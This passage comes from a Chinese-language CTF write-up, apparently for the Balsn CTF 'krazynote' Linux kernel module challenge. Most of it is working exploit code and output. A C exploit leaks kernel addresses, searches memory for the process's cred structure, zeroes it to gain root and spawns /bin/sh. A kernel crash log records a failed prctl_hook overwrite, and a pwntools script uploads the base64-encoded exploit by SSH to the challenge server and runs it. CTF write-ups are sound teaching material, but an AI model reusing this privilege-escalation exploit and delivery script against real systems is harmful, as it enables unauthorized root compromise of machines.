+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">bss_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">module_base</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">-</span> <span class="mh">0x2568</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] key=0x%lx     module_base=0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">module_base</span><span class="p">);</span>
+
+    <span class="c1">// 3. leak base addr, not kernel_base</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">page_offset_base</span> <span class="o">=</span> <span class="n">module_base</span> <span class="o">+</span> <span class="mh">0x1fa</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span> <span class="n">fake_note</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
+    <span class="n">fake_note</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>  <span class="c1">// note2的key变成0</span>
+    <span class="n">fake_note</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+    <span class="n">fake_note</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">page_offset_base</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">page_offset_base_offset</span><span class="p">;</span>
+    <span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">page_offset_base_offset</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] page_offset_base_offset = 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">page_offset_base_offset</span><span class="p">);</span>
+           <span class="c1">//0x1f7处是指令 .text:00000000000001F7                 mov     r12, cs:page_offset_base</span>
+           <span class="c1">//             .text:00000000000001FE                 add     r12, [rax+10h]</span>
+    <span class="c1">// 计算存基址的地址，并读出该地址</span>
+    <span class="n">page_offset_base</span> <span class="o">=</span> <span class="n">module_base</span> <span class="o">+</span> <span class="mh">0x1fe</span> <span class="o">+</span> <span class="n">page_offset_base_offset</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] page_offset_base = 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">page_offset_base</span><span class="p">);</span>
+    <span class="n">fake_note</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+    <span class="n">fake_note</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">page_offset_base</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">base_addr</span><span class="p">;</span>
+    <span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">base_addr</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] base_addr = 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">base_addr</span><span class="p">);</span>
+
+    <span class="c1">// 4. search cred   注意：都是相对base_addr找的，所以从偏移0开始找</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_NAME</span><span class="p">,</span> <span class="s">"try2findmesauce"</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">errExit</span><span class="p">(</span><span class="s">"[-] prctl set name failed"</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span> <span class="n">task</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="n">off</span> <span class="o">+=</span> <span class="mh">0x100</span><span class="p">)</span>  <span class="c1">// 由于length只能是1字节，所以1次只能读0xff</span>
+    <span class="p">{</span>
+        <span class="n">fake_note</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+        <span class="n">fake_note</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xfff</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+        <span class="n">fake_note</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">off</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+        <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">);</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+        <span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+        <span class="n">task</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">memmem</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"try2findmesauce"</span><span class="p">,</span> <span class="mi">14</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">task</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"[+] found: %p 0x%lx, 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">task</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">task</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">task</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0xffff000000000000</span> <span class="o">&amp;&amp;</span> <span class="n">task</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0xffff000000000000</span><span class="p">)</span>  <span class="c1">// 确保cred地址在内核空间</span>
+                <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="c1">// 5. change cred to 0</span>
+    <span class="n">fake_note</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+    <span class="n">fake_note</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x28</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
+    <span class="n">fake_note</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">task</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">base_addr</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>  <span class="c1">// 注意一定是修改相对base_addr的地址</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">fake_cred</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">fake_cred</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_cred</span><span class="p">));</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">fake_cred</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>
+
+    <span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+    <span class="n">execv</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>想利用<code>call_usermodehelper</code>方法来写，但发现prctl_hook怎么都修改不了（可能是系统不允许修改prctl_hook）。报错信息如下：</p>
+<p>不过可以改modprobe_path，利用脚本见<code>exp_modprobe.c</code>。</p>
+<div class="highlight"><pre><span></span>/home/note <span class="c1"># ./test</span>
+<span class="o">[</span>+<span class="o">]</span> init <span class="k">done</span>!
+<span class="o">[</span>+<span class="o">]</span> Handler created
+<span class="o">[</span>+<span class="o">]</span> Trigger! I<span class="err">'</span>m going to hang
+<span class="o">[</span>+<span class="o">]</span> <span class="k">done</span> <span class="m">1</span>
+<span class="o">[</span>+<span class="o">]</span> <span class="nv">key</span><span class="o">=</span>0xffff9a3f0ea52000     <span class="nv">module_base</span><span class="o">=</span>0x65c0c00f0000
+<span class="o">[</span>+<span class="o">]</span> <span class="nv">page_offset_base_offset</span> <span class="o">=</span> 0xe5babaa2
+<span class="o">[</span>+<span class="o">]</span> <span class="nv">page_offset_base</span> <span class="o">=</span> 0x65c0a5c9bca0
+<span class="o">[</span>+<span class="o">]</span> <span class="nv">base_addr</span> <span class="o">=</span> 0xffff9a3f00000000
+<span class="o">[</span>+<span class="o">]</span> real <span class="nv">module_base</span> <span class="o">=</span> 0xffffffffc00f0000
+<span class="o">[</span>+<span class="o">]</span> <span class="nv">kernel_base</span> <span class="o">=</span> 0xffffffffa4e00000
+<span class="o">[</span>+<span class="o">]</span> <span class="nv">order_cmd_addr</span> <span class="o">=</span> 0xffffffffa5e5d940
+<span class="o">[</span>+<span class="o">]</span> <span class="nv">prctl_hook_addr</span> <span class="o">=</span> 0xffffffffa5cb0460
+<span class="o">[</span>+<span class="o">]</span> <span class="nv">poweroff_work_func_addr</span> <span class="o">=</span> 0xffffffffa4ead300
+<span class="o">[</span>*<span class="o">]</span> Wait <span class="m">1</span>!
+<span class="m">1</span>
+<span class="o">[</span>*<span class="o">]</span> Wait <span class="m">2</span>!2
+<span class="o">[</span>   <span class="m">16</span>.235460<span class="o">]</span> BUG: unable to handle kernel paging request at ffffffffa5cb0460
+<span class="o">[</span>   <span class="m">16</span>.238245<span class="o">]</span> <span class="c1">#PF error: [PROT] [WRITE]</span>
+<span class="o">[</span>   <span class="m">16</span>.239130<span class="o">]</span> PGD 9c12067 P4D 9c12067 PUD 9c13063 PMD eb8a163 PTE 8000000009ab0061
+<span class="o">[</span>   <span class="m">16</span>.240921<span class="o">]</span> Oops: <span class="m">0003</span> <span class="o">[</span><span class="c1">#1] SMP PTI</span>
+<span class="o">[</span>   <span class="m">16</span>.241536<span class="o">]</span> CPU: <span class="m">0</span> PID: <span class="m">169</span> Comm: <span class="nb">test</span> Tainted: G           OE     <span class="m">5</span>.1.9 <span class="c1">#1</span>
+<span class="o">[</span>   <span class="m">16</span>.242241<span class="o">]</span> Hardware name: QEMU Standard PC <span class="o">(</span>i440FX + PIIX, <span class="m">1996</span><span class="o">)</span>, BIOS Ubuntu-1.8.2-1ubuntu1 <span class="m">04</span>/01/2014
+<span class="o">[</span>   <span class="m">16</span>.243084<span class="o">]</span> RIP: <span class="m">0010</span>:0xffffffffc00f034f
+<span class="o">[</span>   <span class="m">16</span>.243980<span class="o">]</span> Code: de e8 <span class="m">65</span> 7d <span class="m">31</span> e5 <span class="m">48</span> 2b 2d 6e b9 ba e5 <span class="m">31</span> c0 <span class="m">49</span> <span class="m">89</span> 6c <span class="m">24</span> <span class="m">10</span> e9 eb fd ff ff <span class="m">48</span> 8b <span class="m">44</span> <span class="m">24</span> <span class="m">18</span> <span class="m">49</span> 8d 7c <span class="m">24</span> <span class="m">08</span> <span class="m">48</span> <span class="m">89</span> de <span class="m">48</span> <span class="m">83</span> e7 f8 &lt;<span class="m">49</span>&gt; <span class="m">89</span> <span class="m">04</span> <span class="m">24</span> <span class="m">89</span> e8 <span class="m">48</span> 8b <span class="m">54</span> <span class="m">03</span> f8 <span class="m">49</span> <span class="m">89</span> <span class="m">54</span> <span class="m">04</span> f8 <span class="m">49</span> <span class="m">29</span> <span class="nb">fc</span> <span class="m">31</span> c0 4c
+<span class="o">[</span>   <span class="m">16</span>.246040<span class="o">]</span> RSP: <span class="m">0018</span>:ffffb4a9c0233d40 EFLAGS: <span class="m">00000282</span>
+<span class="o">[</span>   <span class="m">16</span>.246269<span class="o">]</span> RAX: ffffffffa4ead300 RBX: ffffb4a9c0233d58 RCX: ffffffffc00f2550
+<span class="o">[</span>   <span class="m">16</span>.246690<span class="o">]</span> RDX: ffffffffc00f0000 RSI: ffffb4a9c0233d58 RDI: ffffffffa5cb0468
+<span class="o">[</span>   <span class="m">16</span>.247939<span class="o">]</span> RBP: <span class="m">0000000000000020</span> R08: ffffffffc00f0000 R09: <span class="m">0000000000000000</span>
+<span class="o">[</span>   <span class="m">16</span>.248679<span class="o">]</span> R10: <span class="m">0000000000000000</span> R11: <span class="m">0000000000000000</span> R12: ffffffffa5cb0460
+<span class="o">[</span>   <span class="m">16</span>.249253<span class="o">]</span> R13: 00007fff98029c40 R14: 00007fff98029be0 R15: <span class="m">0000000000000000</span>
+<span class="o">[</span>   <span class="m">16</span>.250133<span class="o">]</span> FS:  <span class="m">0000000001524880</span><span class="o">(</span><span class="m">0000</span><span class="o">)</span> GS:ffff9a3f0f400000<span class="o">(</span><span class="m">0000</span><span class="o">)</span> knlGS:0000000000000000
+<span class="o">[</span>   <span class="m">16</span>.251110<span class="o">]</span> CS:  <span class="m">0010</span> DS: <span class="m">0000</span> ES: <span class="m">0000</span> CR0: <span class="m">0000000080050033</span>
+<span class="o">[</span>   <span class="m">16</span>.251654<span class="o">]</span> CR2: ffffffffa5cb0460 CR3: 000000000ea52000 CR4: 00000000003006f0
+<span class="o">[</span>   <span class="m">16</span>.252143<span class="o">]</span> Call Trace:
+<span class="o">[</span>   <span class="m">16</span>.253153<span class="o">]</span>  ? __ia32_sys_reboot+0x20/0x20
+<span class="o">[</span>   <span class="m">16</span>.254058<span class="o">]</span>  ? 0xffffffffc00f0000
+<span class="o">[</span>   <span class="m">16</span>.254712<span class="o">]</span>  do_vfs_ioctl+0xa1/0x620
+<span class="o">[</span>   <span class="m">16</span>.255031<span class="o">]</span>  ? vfs_read+0xfb/0x110
+<span class="o">[</span>   <span class="m">16</span>.255355<span class="o">]</span>  ksys_ioctl+0x66/0x70
+<span class="o">[</span>   <span class="m">16</span>.255582<span class="o">]</span>  __x64_sys_ioctl+0x16/0x20
+<span class="o">[</span>   <span class="m">16</span>.255829<span class="o">]</span>  do_syscall_64+0x55/0x110
+<span class="o">[</span>   <span class="m">16</span>.256102<span class="o">]</span>  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+<span class="o">[</span>   <span class="m">16</span>.256469<span class="o">]</span> RIP: <span class="m">0033</span>:0x4468b7
+<span class="o">[</span>   <span class="m">16</span>.256807<span class="o">]</span> Code: <span class="m">48</span> <span class="m">83</span> c4 <span class="m">08</span> <span class="m">48</span> <span class="m">89</span> d8 5b 5d c3 <span class="m">66</span> 0f 1f <span class="m">84</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">48</span> <span class="m">89</span> e8 <span class="m">48</span> f7 d8 <span class="m">48</span> <span class="m">39</span> c3 0f <span class="m">92</span> c0 eb <span class="m">92</span> <span class="m">66</span> <span class="m">90</span> b8 <span class="m">10</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> 0f <span class="m">05</span> &lt;<span class="m">48</span>&gt; 3d <span class="m">01</span> f0 ff ff 0f <span class="m">83</span> 5d <span class="m">06</span> <span class="nb">fc</span> ff c3 <span class="m">66</span> 2e 0f 1f <span class="m">84</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>
+<span class="o">[</span>   <span class="m">16</span>.257880<span class="o">]</span> RSP: 002b:00007fff98029bc8 EFLAGS: <span class="m">00000246</span> ORIG_RAX: <span class="m">0000000000000010</span>
+<span class="o">[</span>   <span class="m">16</span>.258288<span class="o">]</span> RAX: ffffffffffffffda RBX: 00000000004002e0 RCX: 00000000004468b7
+<span class="o">[</span>   <span class="m">16</span>.258653<span class="o">]</span> RDX: 00007fff98029be0 RSI: ffffffffffffff01 RDI: <span class="m">0000000000000003</span>
+<span class="o">[</span>   <span class="m">16</span>.259016<span class="o">]</span> RBP: 00007fff98029c00 R08: <span class="m">0000000000000000</span> R09: <span class="m">0000000000000000</span>
+<span class="o">[</span>   <span class="m">16</span>.259694<span class="o">]</span> R10: <span class="m">0000000000000000</span> R11: <span class="m">0000000000000246</span> R12: 00000000004073a0
+<span class="o">[</span>   <span class="m">16</span>.259853<span class="o">]</span> R13: <span class="m">0000000000407430</span> R14: <span class="m">0000000000000000</span> R15: <span class="m">0000000000000000</span>
+<span class="o">[</span>   <span class="m">16</span>.260087<span class="o">]</span> Modules linked in: note<span class="o">(</span>OE<span class="o">)</span>
+<span class="o">[</span>   <span class="m">16</span>.263528<span class="o">]</span> CR2: ffffffffa5cb0460
+<span class="o">[</span>   <span class="m">16</span>.266388<span class="o">]</span> ---<span class="o">[</span> end trace 5ced815cb65d3b46 <span class="o">]</span>---
+<span class="o">[</span>   <span class="m">16</span>.269277<span class="o">]</span> RIP: <span class="m">0010</span>:0xffffffffc00f034f
+<span class="o">[</span>   <span class="m">16</span>.270061<span class="o">]</span> Code: de e8 <span class="m">65</span> 7d <span class="m">31</span> e5 <span class="m">48</span> 2b 2d 6e b9 ba e5 <span class="m">31</span> c0 <span class="m">49</span> <span class="m">89</span> 6c <span class="m">24</span> <span class="m">10</span> e9 eb fd ff ff <span class="m">48</span> 8b <span class="m">44</span> <span class="m">24</span> <span class="m">18</span> <span class="m">49</span> 8d 7c <span class="m">24</span> <span class="m">08</span> <span class="m">48</span> <span class="m">89</span> de <span class="m">48</span> <span class="m">83</span> e7 f8 &lt;<span class="m">49</span>&gt; <span class="m">89</span> <span class="m">04</span> <span class="m">24</span> <span class="m">89</span> e8 <span class="m">48</span> 8b <span class="m">54</span> <span class="m">03</span> f8 <span class="m">49</span> <span class="m">89</span> <span class="m">54</span> <span class="m">04</span> f8 <span class="m">49</span> <span class="m">29</span> <span class="nb">fc</span> <span class="m">31</span> c0 4c
+<span class="o">[</span>   <span class="m">16</span>.271021<span class="o">]</span> RSP: <span class="m">0018</span>:ffffb4a9c0233d40 EFLAGS: <span class="m">00000282</span>
+<span class="o">[</span>   <span class="m">16</span>.271331<span class="o">]</span> RAX: ffffffffa4ead300 RBX: ffffb4a9c0233d58 RCX: ffffffffc00f2550
+<span class="o">[</span>   <span class="m">16</span>.271704<span class="o">]</span> RDX: ffffffffc00f0000 RSI: ffffb4a9c0233d58 RDI: ffffffffa5cb0468
+<span class="o">[</span>   <span class="m">16</span>.272078<span class="o">]</span> RBP: <span class="m">0000000000000020</span> R08: ffffffffc00f0000 R09: <span class="m">0000000000000000</span>
+<span class="o">[</span>   <span class="m">16</span>.272486<span class="o">]</span> R10: <span class="m">0000000000000000</span> R11: <span class="m">0000000000000000</span> R12: ffffffffa5cb0460
+<span class="o">[</span>   <span class="m">16</span>.272858<span class="o">]</span> R13: 00007fff98029c40 R14: 00007fff98029be0 R15: <span class="m">0000000000000000</span>
+<span class="o">[</span>   <span class="m">16</span>.273394<span class="o">]</span> FS:  <span class="m">0000000001524880</span><span class="o">(</span><span class="m">0000</span><span class="o">)</span> GS:ffff9a3f0f400000<span class="o">(</span><span class="m">0000</span><span class="o">)</span> knlGS:0000000000000000
+<span class="o">[</span>   <span class="m">16</span>.273865<span class="o">]</span> CS:  <span class="m">0010</span> DS: <span class="m">0000</span> ES: <span class="m">0000</span> CR0: <span class="m">0000000080050033</span>
+<span class="o">[</span>   <span class="m">16</span>.274193<span class="o">]</span> CR2: ffffffffa5cb0460 CR3: 000000000ea52000 CR4: 00000000003006f0
+<span class="o">[</span>   <span class="m">16</span>.274679<span class="o">]</span> Kernel panic - not syncing: Fatal exception
+<span class="o">[</span>   <span class="m">16</span>.275555<span class="o">]</span> Kernel Offset: 0x23e00000 from 0xffffffff81000000 <span class="o">(</span>relocation range: 0xffffffff80000000-0xffffffffbfffffff<span class="o">)</span>
+<span class="o">[</span>   <span class="m">16</span>.276853<span class="o">]</span> Rebooting in <span class="m">1</span> seconds..
+</pre></div>
+<h2 data-content="1" id="a1b8981779b5322a268a99bb8ed61fc0">问题</h2>
+<h4 data-content="1" id="fbd2ea053e118ddc8403ff2963922033">1.打包错误</h4>
+<div class="highlight"><pre><span></span><span class="c1">#重新打包后会报错，可能是/bin/busybox 给的权限不对，chmod 777再打包就可以了</span>
+mount: you must be root 
+mount: you must be root
+mount: you must be root 
+/etc/init.d/rcS: line <span class="m">8</span>: can<span class="s1">'t create /proc/sys/kernel/dmesg_restrict: nonexistent directory </span>
+<span class="s1">/etc/init.d/rcS: line 9: can'</span>t create /proc/sys/kernel/kptr_restrict: nonexistent directory insmod: 
+can<span class="s1">'t insert '</span>note.ko<span class="err">'</span>: Operation not permitted
+</pre></div>
+<h4 data-content="1" id="259ecdf91a9e7cb26c4cc315729eac2b">2.文件过大</h4>
+<p>可以参考<a href="https://thekidofarcrania.gitlab.io/2019/06/13/0ctf19-finals/" target="_blank">这篇writeup</a>，利用<a href="https://www.uclibc.org/" target="_blank">uclibc</a>来编译二进制文件，环境配置比较麻烦，可直接下载一个<a href="https://hub.docker.com/r/klee/uclibc" target="_blank">配置好的系统</a>。</p>
+<h4 data-content="1" id="6f3103e265b6b2b7b0fdb60d9ad1b617">3.上传文件并执行</h4>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python2</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">print_cmd</span> <span class="o">=</span> <span class="bp">True</span><span class="p">,</span> <span class="n">print_resp</span> <span class="o">=</span> <span class="bp">False</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">print_cmd</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"$"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"$"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">print_resp</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">unrecv</span><span class="p">(</span><span class="s2">"$"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">resp</span>
+
+<span class="k">def</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="nb">file</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="n">b64e</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
+
+    <span class="n">send_command</span><span class="p">(</span><span class="s2">"rm /home/note/a.gz.b64"</span><span class="p">)</span>
+    <span class="n">send_command</span><span class="p">(</span><span class="s2">"rm /home/note/a.gz"</span><span class="p">)</span>
+    <span class="n">send_command</span><span class="p">(</span><span class="s2">"rm /home/note/a"</span><span class="p">)</span>
+
+    <span class="n">size</span> <span class="o">=</span> <span class="mi">800</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="o">/</span><span class="n">size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"Sending chunk {}/{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="o">/</span><span class="n">size</span><span class="p">))</span>
+        <span class="n">send_command</span><span class="p">(</span><span class="s2">"echo -n '{}'&gt;&gt;/home/note/a.gz.b64"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">size</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="n">size</span><span class="p">]),</span> <span class="bp">False</span><span class="p">)</span>
+
+    <span class="n">send_command</span><span class="p">(</span><span class="s2">"cat /home/note/a.gz.b64 | base64 -d &gt; /home/note/a.gz"</span><span class="p">)</span>
+    <span class="n">send_command</span><span class="p">(</span><span class="s2">"gzip -d /home/note/a.gz"</span><span class="p">)</span>
+    <span class="n">send_command</span><span class="p">(</span><span class="s2">"chmod +x /home/note/a"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+    <span class="n">send_file</span><span class="p">(</span><span class="s2">"exploit.gz"</span><span class="p">)</span>
+    <span class="c1">#send_command("/home/note/a")</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"/home/note/a"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+
+    <span class="c1">#context.log_level = 'debug'</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">"krazynote-3.balsnctf.com"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">54321</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s2">"knote"</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">"knote"</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">shell</span><span class="p">(</span><span class="s1">'/bin/sh'</span><span class="p">)</span>
+    <span class="c1">#p = process("./run.sh")</span>
+    <span class="n">exploit</span><span class="p">()</span>
+</pre></div>
+<h2 data-content="1" id="4ec5fa75e31d0a1534c89925c4bc5308">参考</h2>
+<p><a href="https://www.anquanke.com/post/id/189015" target="_blank">https://www.anquanke.com/post/id/189015</a></p>
+<p><a href="https://pr0cf5.github.io/ctf/2019/10/10/balsn-ctf-krazynote.html" target="_blank">https://pr0cf5.github.io/ctf/2019/10/10/balsn-ctf-krazynote.html</a></p>
+<p><a href="https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/krazynote.c" target="_blank">https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/krazynote.c</a></p>
+<p><a href="https://blog.lizzie.io/using-userfaultfd.html" target="_blank">userfaultfd使用方法</a></p>
+<p><a href="http://blog.jcix.top/2018-10-01/userfaultfd_intro/" target="_blank">从内核到用户空间(1) — 用户态缺页处理机制 userfaultfd 的使用</a></p>
+<p><a href="http://man7.org/linux/man-pages/man2/userfaultfd.2.html" target="_blank">http://man7.org/linux/man-pages/man2/userfaultfd.2.html</a></p>
+<p><a href="https://github.com/pr0cf5/CTF-writeups/blob/master/2019/BalsnCTF/knote/exploit.c" target="_blank">https://github.com/pr0cf5/CTF-writeups/blob/master/2019/BalsnCTF/knote/exploit.c</a></p>
+</div>
+</div>
